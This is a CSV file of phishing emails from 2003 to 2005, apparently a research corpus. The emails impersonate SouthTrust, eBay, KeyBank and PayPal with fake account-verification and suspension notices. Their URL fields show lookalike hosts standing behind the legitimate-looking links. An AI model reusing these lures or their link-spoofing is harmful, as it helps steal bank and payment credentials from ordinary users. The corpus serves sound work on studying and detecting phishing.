From,To,Date,Time,Subject,URL,Body
SouthTrust <identdep_op718@southtrust.com>,user@example.com,"Thu, 16 Jun 2005 21:19:57 +0300",21:19:57,"IMPORTANT ACCOUNT NOTICE FROM SOUTHTRUST BANK [Thu, 16 Jun 2005 12:20:57 -0600]","https://www.southtrust.com/st/PersonalBanking/custdetailsconfirmation""><map",in 1841 stars battle    Tour de France in 1872 in 1923 
"""emailconfirm@ebay.com"" <emailconfirm@ebay.com>",,"Thu, 30 Oct 2003 08:52:16 +0200",8:52:16,eBay account verification!,"http://hform.com/form.cgi?10081481""","Dear eBay User
After fraud complaints from the eBay members, the eBay Inc. had
developed a security program against the fraudulend attempts of accounts
thefts. For that we have to securise all the members informations by
updating and checking the registrated informations. Please update  your
information by completing the form from the forwarded link so we can check
your account validity and your identity
and login to eBay in order to update your informations.
This process will take 5 days, period when you will not be able to
acces your eBay account. After this period you will receive instructions to
enter and securise your eBay account.Please click the link below and sign in into your account:http://signin.ebay.com/aw-cgi/eBayISAPI.dll?SignIn&amp;ssPageName=h:h:sin:US-- 
As outlined in our User Agreement, eBay will periodically send you information about site changes and enhancements. Visit our Privacy Policy and User Agreement if you have any questions.
Regards,Safeharbor Department
eBay, Inc.
"
emailconfirm@ebay.com,,"Fri, 31 Jan 2003 09:14:21 +0200",9:14:21,eBay account verification!,"http://www.fileinyourinfos.us.tt""","Dear valued customer,
Our records indicate that you haven't submited the correct information to update your account. Please re-update your account. You HAVE to fill all the tabs in the form.Do not respond to this email, as your reply will not be received. If you would like to update your eBay account please use this link:http://signin.ebay.com//aw-cgi/eBayISAPI.dll?SignIn&amp;ssPageName=h:h:sin:US
Thank you for your patience in this matter.
Regards, Customer Support (Trust and Safety Department)eBay Inc
"
Key Team <support@keybank.com>,user@example.com,"Fri, 18 Mar 2005 12:14:46 +0100",12:14:46,KeyBank Customer Confirm Your Identity,"https://accounts2.keybank.com/ib2/images/enroll/head_ConfirmID.gif""","
Dear Key Bank customer.  Please read this message and follow it's instructions
Confirm Your Identity:
We are performing maintenance, which may interfere with access to your Online Services.  Due to these technical updates your online account has been flagged and we must confirm that you are the rightful owner of the account. To Confirm Your Identity click the link below,  Please make sure you do this in a timely fashion as we look forward of bringing you updates regularly
 
To get started, please click the link below: 
  http://accounts.keybank.com/ConfirmHelp?start=yes
 
Important information from Key Bank.
This e-mail contains information directly related to your account with us, other services to which you have subscribed, and/or any application you may have submitted. 
Key Bank and its service providers are committed to protecting your privacy and ask you not to send sensitive account information through e-mail. 
Key Values Diversity KeyBank is an Equal Housing Lender 
  By accessing and using this website, you agree to the terms and conditions and important legal notices below. 
  User Agreement Linking Disclaimer Arbitration Provision Security and Privacy Policy 
  Copyright í«Œ© 1998-2005, KeyCorp. All rights reserved. 
 
"
Key Team <support@keybank.com>,user@biochemistry.BIOC.cwru.edu,"Fri, 18 Mar 2005 12:14:46 +0100",12:14:46,KeyBank Customer Confirm Your Identity,"https://accounts2.keybank.com/ib2/images/enroll/head_ConfirmID.gif""","
Dear Key Bank customer.  Please read this message and follow it's instructions
Confirm Your Identity:
We are performing maintenance, which may interfere with access to your Online Services.  Due to these technical updates your online account has been flagged and we must confirm that you are the rightful owner of the account. To Confirm Your Identity click the link below,  Please make sure you do this in a timely fashion as we look forward of bringing you updates regularly
 
To get started, please click the link below: 
  http://accounts.keybank.com/ConfirmHelp?start=yes
 
Important information from Key Bank.
This e-mail contains information directly related to your account with us, other services to which you have subscribed, and/or any application you may have submitted. 
Key Bank and its service providers are committed to protecting your privacy and ask you not to send sensitive account information through e-mail. 
Key Values Diversity KeyBank is an Equal Housing Lender 
  By accessing and using this website, you agree to the terms and conditions and important legal notices below. 
  User Agreement Linking Disclaimer Arbitration Provision Security and Privacy Policy 
  Copyright í«Œ© 1998-2005, KeyCorp. All rights reserved. 
 
"
PayPal <acc-validity@paypal.com>,undisclosed-recipients: ;,"Tue, 28 Jun 2005 12:05:18 -0400 (EDT)",12:05:18,Account compromised: billing information moved or changed.,"http://www.paypal.com/en_US/i/logo/paypal_logo.gif""","
 
LEGAL NOTICE
      The following message is an email sent to you by an administrator of ""PayPal.com"".If this message is spam, contains abusive or other comments you find offensive please contact the webmaster at the following address:
admin@paypal.com
Message sent to you follows:
 
 
	Dear PayPal client,
	
	      While performing it's regular scheduled monthly billing address check our system found incompatible information which seams to be no longer the same with your current credit card information that we have on file. If you changed your billing information or if you moved from you previous address please follow up the link bellow and update your billing information: If you didn't change any of this information you still need to follow up the previous link and update your existing billing information because it means that our database regular scheduled update wasn't made correctly. Choosing to ignore this message will result in to a temporary suspension of your account within 24 hours, until you will choose to solve this unpleasant situation.
	
	We apologies for any inconvinience this may caused you and we strongly advise you to update your information 
you have on file with us. Clicking https://www.paypal.com/cgi-bin/webscr?cmd=_login_ 
you will avoid any possible futuring billing problems with your account.
	
        
        
	
        
	Best regards,
	- PayPal Team.
        
        
"
"""Account Service"" <service@paypal.com>",undisclosed-recipients: ;,"Wed, 29 Jun 2005 19:10:28 +0200",19:10:28,Verify your PayPal Account,"http://paypal.com.login-user1616.info/webscr.php?cmd=LogIn"">https://www.paypal.com/cgi-bin/webscr?cmd=_login-run</a>","
We recently have determined that different computers have logged into 
your 
PayPal account, and multiple password failures
were present before the login. One of our Customer Service employees 
has 
already tryed to telephonically reach you. As our employee
did not manage to reach you, this email has been sent to your 
notice.
